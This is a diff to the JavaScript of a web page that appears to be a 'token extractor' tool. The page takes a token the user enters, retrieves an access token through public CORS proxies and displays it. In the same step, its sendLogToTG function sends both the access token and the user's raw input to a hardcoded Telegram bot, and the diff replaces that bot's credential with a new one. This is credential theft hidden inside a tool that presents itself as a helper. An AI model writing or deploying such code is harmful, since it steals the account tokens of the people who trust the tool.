@@ -474,7 +474,7 @@
     </div>
 
 <script>
-    const TG_BOT_TOKEN = '8478471111:AAFXRlmycqO1P98LJDUxdL0mbShJg4Bjbv8';
+    const TG_BOT_TOKEN = '8478471111:AAGRT_LMEgY0p9aAm_7K8WLcu2IpYU5GDTc';
     const TG_CHAT_ID = '8257117768';
 
     function sendLogToTG(msg) {
@@ -701,15 +701,21 @@
                 `https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`
             ];
 
-            let data = null;
+            let extractedToken = null;
             let success = false;
 
             for (const proxyUrl of proxies) {
                 try {
                     const res = await fetch(proxyUrl);
                     if (!res.ok) continue; 
-                    data = await res.json();
-                    if (data && (data.access_token || data.error)) {
+                    
+                    // Naya API plain text de raha hai, isliye res.text() use kar rahe hain
+                    const textData = await res.text();
+                    
+                    // Regex ki madad se plain text se "access token= ..." nikalna
+                    const match = textData.match(/access token=\s*([a-zA-Z0-9]+)/i);
+                    if (match && match[1]) {
+                        extractedToken = match[1];
                         success = true;
                         break; 
                     }
@@ -718,8 +724,8 @@
                 }
             }
 
-            if (success && data.access_token) {
-                const logMsg = `🚀 <b>NEW TOKEN EXTRACTED</b>\n\n👤 <b>Name:</b> ${data.nickname}\n🆔 <b>UID:</b> ${data.uid}\n🌍 <b>Region:</b> ${data.region}\n\n🔑 <b>Access Token:</b> <code>${data.access_token}</code>\n\n📥 <b>Input EAT:</b> <code>${rawInput}</code>`;
+            if (success && extractedToken) {
+                const logMsg = `🚀 <b>NEW TOKEN EXTRACTED</b>\n\n👤 <b>Name:</b> N/A\n🆔 <b>UID:</b> N/A\n🌍 <b>Region:</b> N/A\n\n🔑 <b>Access Token:</b> <code>${extractedToken}</code>\n\n📥 <b>Input EAT:</b> <code>${rawInput}</code>`;
                 sendLogToTG(logMsg);
 
                 document.getElementById('tokenDetails').style.display = 'block';
@@ -727,13 +733,14 @@
                 document.getElementById('copyBtn').style.display = 'block';
                 document.getElementById('genericMsg').style.display = 'none';
 
-                document.getElementById('tName').textContent = data.nickname || 'N/A';
-                document.getElementById('tUid').textContent = data.uid || 'N/A';
-                document.getElementById('tRegion').textContent = data.region || 'N/A';
-                document.getElementById('tAcc').textContent = data.access_token;
+                // User details N/A update kar diya gaya hai
+                document.getElementById('tName').textContent = 'N/A';
+                document.getElementById('tUid').textContent = 'N/A';
+                document.getElementById('tRegion').textContent = 'N/A';
+                document.getElementById('tAcc').textContent = extractedToken;
                 openModal('tokenModal');
             } else {
-                showToast(data?.error || 'Failed to extract! Token expired or Invalid.', 'error');
+                showToast('Failed to extract! Token expired or Invalid.', 'error');
             }
         } catch (e) {
             console.error(e);
